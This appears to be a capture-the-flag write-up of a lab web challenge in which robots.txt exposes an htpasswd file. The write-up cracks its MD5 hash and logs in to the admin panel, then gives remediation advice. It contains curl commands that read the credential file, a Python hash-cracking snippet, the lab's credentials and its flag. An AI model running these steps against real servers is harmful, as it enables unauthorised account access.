# Admin Htpasswd - Exposed Credentials via robots.txt

## Breach Type
**Security Misconfiguration / Sensitive Data Exposure** — OWASP Top 10: A05:2021 Security Misconfiguration

## What is this Vulnerability?
**Sensitive Data Exposure via Security Misconfiguration** is a chain of vulnerabilities where poor server configuration leads to the exposure of sensitive files, and weak cryptography makes the exposed credentials trivially crackable.

This breach chains three distinct problems:
1. **robots.txt information leak**: The `robots.txt` file (meant for search engines) lists `/whatever` as a disallowed path — effectively telling attackers exactly where to look
2. **Exposed `.htpasswd` file**: The Apache `.htpasswd` file (which stores usernames and password hashes for HTTP Basic Authentication) is placed inside a web-accessible directory instead of being outside the web root
3. **Weak password hashing**: The password is hashed with plain MD5 (not even salted), and the password itself is `qwerty123@` — easily crackable with any online MD5 lookup in seconds

Each problem alone is bad, but chained together they provide a direct path from zero to admin access in under 60 seconds.

### Why is it dangerous?
- **Immediate credential exposure**: Anyone who reads robots.txt can find and read the password file
- **Trivial password cracking**: MD5 hashes of common passwords are pre-computed in rainbow tables and online databases
- **Admin access**: Cracking the password gives full admin access to the application
- **Automated exploitation**: Bots regularly scan for common files like robots.txt, .htpasswd, .env, wp-config.php
- **Lateral movement**: Exposed credentials are often reused on other services (SSH, database, email)

### Real-world impact
Exposed configuration files are one of the most common causes of data breaches. In 2019, researchers found thousands of exposed `.env` files containing database credentials, API keys, and encryption secrets on the public internet.

## Where
- `http://<IP>/robots.txt` — reveals hidden directories
- `http://<IP>/whatever/htpasswd` — exposed Apache htpasswd file
- `http://<IP>/admin/` — admin login panel

## How I Found It
1. Checked `robots.txt` (standard first step in web recon):
   ```
   User-agent: *
   Disallow: /whatever
   Disallow: /.hidden
   ```
2. Navigated to `/whatever/` and found an exposed `htpasswd` file.
3. The `htpasswd` file contained: `root:437394baff5aa33daa618be47b75cb49`
4. The hash `437394baff5aa33daa618be47b75cb49` is an MD5 hash.
5. Cracked it: `437394baff5aa33daa618be47b75cb49` → **`qwerty123@`**
6. Found the `/admin/` login page and logged in with `root` / `qwerty123@`.

## Step-by-Step Exploitation

### Step 1: Read robots.txt
```bash
curl "http://<IP>/robots.txt"
```
Output:
```
User-agent: *
Disallow: /whatever
Disallow: /.hidden
```

### Step 2: Access the htpasswd File
```bash
curl "http://<IP>/whatever/htpasswd"
```
Output:
```
root:437394baff5aa33daa618be47b75cb49
```

### Step 3: Crack the MD5 Hash
```bash
# Using Python
python3 -c "
import hashlib
# Try common passwords
passwords = ['admin', 'root', 'password', 'qwerty123@', '123456']
target = '437394baff5aa33daa618be47b75cb49'
for p in passwords:
    if hashlib.md5(p.encode()).hexdigest() == target:
        print(f'Password: {p}')
        break
"
# Password: qwerty123@
```
Or use an online MD5 lookup tool like crackstation.net.

### Step 4: Login to the Admin Panel
```bash
curl "http://<IP>/admin/" -u "root:qwerty123@"
```
Or via POST if it's a form:
```bash
curl -X POST "http://<IP>/admin/" -d "username=root&password=qwerty123@&Login=Login"
```

### Step 5: Get the Flag
```
The flag is d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff
```

## Flag
```
d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff
```

## How to Test Manually
1. Open `http://<IP>/robots.txt` in your browser → see `/whatever` listed
2. Open `http://<IP>/whatever/htpasswd` → see `root:437394baff5aa33daa618be47b75cb49`
3. Go to https://crackstation.net and paste the hash → get `qwerty123@`
4. Open `http://<IP>/admin/` → login with `root` / `qwerty123@`
5. The flag is displayed

## How to Fix
- **Never expose sensitive files** like `.htpasswd` in web-accessible directories
- **Move htpasswd outside the web root** (e.g., `/etc/apache2/.htpasswd`)
- **Set proper file permissions**: `chmod 640 .htpasswd`
- **Configure Apache** to deny access to sensitive files:
  ```apache
  <Files ".htpasswd">
      Require all denied
  </Files>
  ```
- **Don't list sensitive directories** in `robots.txt` — this actually helps attackers discover them
- **Use strong passwords** — `qwerty123@` is trivially crackable
- **Use bcrypt** instead of MD5 for password hashing (`htpasswd -B`)
- **Don't use the same credentials** for multiple services

## OWASP Reference
- [Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)
